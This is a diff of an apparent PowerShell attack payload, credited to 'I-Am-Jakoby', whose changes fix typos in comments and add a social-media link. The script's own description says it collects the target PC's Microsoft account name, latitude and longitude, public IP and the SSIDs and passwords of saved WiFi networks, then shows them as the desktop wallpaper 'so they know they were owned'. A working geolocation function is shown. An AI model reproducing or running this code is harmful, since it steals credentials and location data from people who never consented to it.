@@ -10,7 +10,7 @@
 #                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
 #                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
 #__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#                                                                                                            #         /       \   /     ~ \               #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
 #  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
 #  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
 #  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
@@ -21,10 +21,10 @@
 
 .DESCRIPTION 
 	This program gathers details from target PC to include name associated with the microsoft account, their latitude and longitude, 
-	Public IP, and  and the SSID and WiFi password of any current or previously connected to networks.
-	It will take the gathered information and generate a .jpg with that information on show 
-	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned
-	Additionally a secret message will be left in the binary of the wallpaper image generated and left on their desktop
+	Public IP, the SSID, and WiFi password of any current or previously connected to networks.
+	It will take the gathered information and generate a .jpg with that information on show.
+	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned.
+	Additionally, a secret message will be left in the binary of the wallpaper image generated and left on their desktop.
 #>
 #############################################################################################################################################
 
@@ -75,14 +75,14 @@ echo "`nYour computer is not very secure" >> $Env:temp\foo.txt
 <#
 
 .NOTES 
-	This is to get the current Latitide and Longitude of your target
+	This is to get the current Latitude and Longitude of your target
 #>
 
 function Get-GeoLocation{
 	try {
 	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
 	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
+	$GeoWatcher.Start() #Begin resolving current location
 
 	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
 		Start-Sleep -Milliseconds 100 #Wait for discovery.
@@ -91,7 +91,7 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
 		
 	}
 	}
@@ -168,7 +168,7 @@ if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
     
     }
  
- # If no password set date is detected funtion will return $null to cancel Sapi Speak
+ # If no password set date is detected function will return $null to cancel Sapi Speak
 
     # Write Error is just for troubleshooting 
     catch {Write-Error "Day password set not found" 
